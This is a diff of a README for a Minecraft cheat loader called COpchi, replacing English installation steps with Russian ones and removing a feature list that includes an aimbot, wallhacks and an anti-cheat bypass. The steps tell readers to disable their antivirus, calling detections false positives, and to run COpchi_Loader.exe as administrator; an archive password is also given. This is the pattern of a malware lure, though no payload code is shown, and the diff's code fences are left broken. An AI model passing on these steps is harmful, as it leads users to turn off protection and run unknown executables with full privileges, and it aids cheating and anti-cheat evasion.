@@ -9,22 +9,14 @@
 🔐 **Password**: <span style="color: #FFFF55">123</span>
 
 ```diff
-# Installation Steps
-1. ⚠️ Disable antivirus (false positives; see FAQ below)
-2. ▶️ Run COpchi_Loader.exe as Administrator
-3. 🎮 Select Minecraft version and inject!
+## <span style="color: #FF5555">⚙️</span> <span style="color: #5555FF">Шаги по установке</span>
 
-# For Developers: Build from Source
+1. <span style="color: #FFFF55">⚠️ Отключите антивирус</span> (ложные срабатывания; см. раздел «Часто задаваемые вопросы» ниже)
+2. <span style="color: #55FF55">▶️ Запустите</span> `COpchi_Loader.exe` от имени администратора
+3. <span style="color: #55FFFF">🎮 Выберите версию Minecraft</span> и внедрите!
+
+```bash
+# Для разработчиков: сборка из исходного кода
 git clone https://github.com/COpchi/COpchiCHEATV11.1
 cd COpchiCHEATV11.1
 mvn clean package
-
-<span style="color: #FF5555">🔥</span> <span style="color: #FF5555">Core Features</span>
-<span style="color: #55FF55">✔</span> <span style="color: #55FFFF">Aimbot</span>: Pinpoint accuracy with smooth tracking and bone selection
-<span style="color: #55FF55">✔</span> <span style="color: #FF55FF">KillAura</span>: 360° auto-attacks with entity filtering
-<span style="color: #55FF55">✔</span> <span style="color: #55FF55">ESP</span>: Wallhacks with boxes, tracers and health indicators
-<span style="color: #55FF55">✔</span> <span style="color: #FFAA55">NoFall</span>: Zero damage from any height
-<span style="color: #55FF55">✔</span> <span style="color: #FF5555">AntiAntiCheat</span>: Bypasses screenshares
-<span style="color: #55FF55">✔</span> <span style="color: #5555FF">Multi-Version</span>: 1.8.9 to 1.20.4 support
-
-diff
